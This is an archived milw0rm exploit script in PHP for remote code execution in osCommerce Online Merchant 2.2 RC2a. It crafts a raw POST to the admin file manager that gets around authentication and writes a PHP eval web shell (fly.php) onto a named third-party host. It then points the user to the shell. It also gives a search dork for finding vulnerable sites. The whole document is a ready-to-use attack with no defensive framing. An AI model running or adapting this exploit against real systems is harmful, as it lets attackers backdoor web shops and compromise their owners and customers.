<html><head><title>osCommerce Online Merchant 2.2 RC2a Code Execution Exploit</title></head><pre>&lt;?php
print_r('
+---------------------------------------------------------------------------+
osCommerce Online Merchant 2.2 RC2a RCE Exploit
by Flyh4t
mail: phpsec@hotmail.com
team: http://www.wolvez.org
dork: Powered by osCommerce
Gr44tz to q1ur3n 、puret_t、uk、toby57 and all the other members of WST
Thx to exploits of blackh
+---------------------------------------------------------------------------+
');
$host ='democn.51osc.com';
$path = '/';
$admin_path = 'admin/';
$shellcode = &quot;filename=fly.php&amp;file_contents=test&lt;?php%20@eval(\$_POST[aifly]);?&gt;&quot;;
$message=&quot;POST &quot;.$path.$admin_path.&quot;file_manager.php/login.php?action=save HTTP/1.1\r\n&quot;;
$message.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$message.=&quot;Accept-Language: zh-cn\r\n&quot;;
$message.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$message.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$message.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$message.=&quot;Host: $host\r\n&quot;;
$message.=&quot;Content-Length: &quot;.strlen($shellcode).&quot;\r\n&quot;;
$message.=&quot;Connection: Close\r\n\r\n&quot;;
$message.=$shellcode;
$fd = fsockopen($host,'80');
if(!$fd)
{
    echo '[~]No response from'.$host;
    die;
}
fputs($fd,$message);
echo (&quot;[+]Go to see U webshell : $host/fly.php&quot;);
?&gt;

# milw0rm.com [2009-08-31]</pre></html>